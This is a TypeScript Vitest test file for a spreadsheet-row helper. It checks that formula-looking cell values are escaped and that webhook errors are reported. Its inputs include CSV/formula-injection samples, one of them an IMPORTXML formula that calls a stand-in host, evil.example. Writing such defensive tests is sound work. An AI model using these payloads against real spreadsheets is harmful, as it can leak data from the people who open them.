import { describe, it, expect, vi, afterEach } from 'vitest'
import { toSafeCell, appendSheetRow, sheetConfigFromEnv } from '@/lib/sheets'

const config = { webhookUrl: 'https://script.example/exec', secret: 's3cret' }

function mockFetch(response: Response) {
  const fn = vi.fn().mockResolvedValue(response)
  vi.stubGlobal('fetch', fn)
  return fn
}

afterEach(() => {
  vi.unstubAllGlobals()
  vi.unstubAllEnvs()
})

describe('toSafeCell', () => {
  it.each(['=IMPORTXML("https://evil.example","//x")', '+1+1', '-2', '@SUM(A1)', '\t=1', '\r=1'])(
    'neutralises a formula-looking value: %j', value => {
      expect(toSafeCell(value)).toBe(`'${value}`)
    },
  )

  it.each(['Plain answer', 'a = b inside', '', 'Email me@example.org'])('leaves %j alone', value => {
    expect(toSafeCell(value)).toBe(value)
  })
})

describe('sheetConfigFromEnv', () => {
  it('is null until both values are set', () => {
    vi.stubEnv('FELLOWSHIP_SHEET_WEBHOOK_URL', '')
    vi.stubEnv('FELLOWSHIP_SHEET_SECRET', '')
    expect(sheetConfigFromEnv()).toBeNull()
    vi.stubEnv('FELLOWSHIP_SHEET_WEBHOOK_URL', config.webhookUrl)
    expect(sheetConfigFromEnv()).toBeNull()
    vi.stubEnv('FELLOWSHIP_SHEET_SECRET', config.secret)
    expect(sheetConfigFromEnv()).toEqual(config)
  })
})

describe('appendSheetRow', () => {
  it('posts the secret, the headers and an escaped row', async () => {
    const fetchFn = mockFetch(Response.json({ ok: true }))
    await appendSheetRow(config, ['Name', 'Answer'], ['Amina', '=HYPERLINK("x")'])

    const [url, init] = fetchFn.mock.calls[0]
    expect(url).toBe(config.webhookUrl)
    expect(JSON.parse(init.body)).toEqual({
      secret: 's3cret',
      headers: ['Name', 'Answer'],
      row: ['Amina', `'=HYPERLINK("x")`],
    })
  })

  it('refuses a row that does not match the headers', async () => {
    mockFetch(Response.json({ ok: true }))
    await expect(appendSheetRow(config, ['a', 'b'], ['only one'])).rejects.toThrow(/1 cells for 2 headers/)
  })

  it('fails on an HTTP error', async () => {
    mockFetch(new Response('nope', { status: 500 }))
    await expect(appendSheetRow(config, ['a'], ['b'])).rejects.toThrow(/HTTP 500/)
  })

  it('explains a sign-in page instead of JSON', async () => {
    mockFetch(new Response('<html>Sign in</html>', { status: 200 }))
    await expect(appendSheetRow(config, ['a'], ['b'])).rejects.toThrow(/deployment access/)
  })

  it('fails when the script refuses the row', async () => {
    mockFetch(Response.json({ ok: false, error: 'unauthorised' }))
    await expect(appendSheetRow(config, ['a'], ['b'])).rejects.toThrow(/unauthorised/)
  })
})
